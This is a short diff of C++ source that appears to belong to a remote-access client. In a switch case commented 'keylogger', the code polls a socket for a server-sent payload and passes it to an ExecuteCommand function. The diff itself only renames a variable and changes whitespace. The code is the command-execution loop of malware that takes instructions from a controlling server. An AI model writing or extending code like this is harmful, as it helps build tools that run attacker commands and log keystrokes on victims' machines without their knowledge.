@@ -92,17 +92,17 @@ int main()
 
                     case '5':                                                                                     //keylogger
                     {
-
+                        
                         if(receive_data(sock,"from_server.txt")[0] == '`')
                         {
                             Sleep(100);
                             cout<< "waiting for payload " << endl;
-                        }  
+                        }      
                         else
                         {
-                            string payload = (receive_data(sock,"from_server.txt").substr(1));
-                            cout << "Recieved after waiting ->" << payload << endl;
-                            ExecuteCommand(payload);
+                            string payload_keylogger = (receive_data(sock,"from_server.txt").substr(1));
+                            cout << "Recieved after waiting ->" << payload_keylogger << endl;
+                            ExecuteCommand(payload_keylogger);
                         }
                         
                         send_data(sock,"from_server.txt","`");
